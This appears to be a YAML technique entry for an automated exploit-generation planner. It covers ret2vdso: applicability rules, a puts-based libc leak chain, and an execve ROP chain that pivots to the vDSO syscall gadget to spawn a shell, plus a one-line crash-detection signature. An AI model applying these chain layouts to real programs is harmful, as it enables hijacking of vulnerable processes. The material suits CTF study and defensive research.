technique: ret2vdso
author: Gregory Epp
source: https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2vdso/

rules:
  - id: app_ret2vdso
    head: [applicable, ret2vdso]
    conditions:
      - [fact, vuln, sof]
      - [fact, nx, true]
      - [fact, pie, true]

kb:
  - id: ret2vdso_001
    technique: ret2vdso
    description: >
      The vDSO is mapped at a near-static offset for the process's
      lifetime: gadgets in it survive PIE randomization of the main
      image. A syscall-bearing page the loader itself mapped - scarce
      gadgets, but exactly where the main binary has none.
    chain: [vdso_base_establish, gadget_hunt, syscall_hop]
    unlocks: [reg_control]
    success_rate: 0.30

mcts:
  requires: []
  provides: [reg_control]
  terminal: true
  success: 0.30

build:
  technique: ret2vdso
  # the vDSO is mapped at a near-static offset for the process's
  # lifetime: gadgets in it survive PIE randomization of the main
  # image. The leak stage: puts(GOT[puts]) rides the libc pointer out
  # (the echo carries the raw bytes). The strike: the exploit hunts
  # the vDSO's syscall gadget in the auxv walk (the leak facts), then
  # rides the chain: pop rdi, rsi, rdx, rax; the vDSO's syscall; ret.
  variants:
    - name: leak_stage
      layout:
        - [padding, measured_offset]
        - [chain, "gadget:pop_rdi_rsi_rdx_ret", "const:0", "const:0", "const:0",
           "got_addr:puts", "plt_addr:puts"]
    - name: strike
      layout:
        - [padding, measured_offset]
        - [chain, "gadget:pop_rdi_rsi_rdx_ret", "leak:sh_cmd", "const:0",
           "const:0", "gadget:pop_rax_ret", "const:59", "leak:vdso_syscall"]

priors: [1, 5]


# The defender side (the corpus read backwards): what this technique
# looks like to the defenses. Armored by check 9.
detection:
  - channel: crash
    signature: "control into the vDSO mapping"
    note: "the vDSO landing"
